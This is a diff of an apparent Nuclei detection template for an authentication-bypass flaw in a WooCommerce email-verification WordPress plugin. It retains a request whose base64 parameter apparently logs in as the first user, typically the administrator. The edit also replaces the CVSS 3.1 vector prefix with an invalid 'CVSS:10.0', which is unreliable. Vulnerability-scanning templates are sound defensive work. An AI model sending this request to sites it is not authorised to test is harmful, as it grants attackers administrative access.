@@ -10,12 +10,12 @@ info:
     - https://wpvulndb.com/vulnerabilities/10318
     - https://wpscan.com/vulnerability/0c93832c-83db-4053-8a11-70de966bb3a8
   classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
-    cvss-score: 10
+    cvss-metrics: CVSS:10.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10.0
     cwe-id: CWE-288
+  tags: woocommerce,wp,wpscan,wordpress,wp-plugin
   metadata:
     max-request: 2
-  tags: woocommerce,wp,wpscan,wordpress,wp-plugin,vuln
 
 http:
   - method: GET
@@ -24,7 +24,6 @@ http:
       - "{{BaseURL}}/?alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0="
 
     stop-at-first-match: true
-
     matchers-condition: and
     matchers:
       - type: regex
@@ -42,4 +41,5 @@ http:
       - type: status
         status:
           - 200
-# digest: 4a0a00473045022100eea72f07a9c4aa6c7ef8ee9b1a5e39b2b8efcf723c1a0d6e4945d4a115575d2b022060bcb62cc94dd0b2a09764025b9a4df29725b953d2ee7f33b3ca96b5cc53bd73:922c64590222798bb761d5b6d8e72950
+
+# Enhanced by mp on 2022/05/31
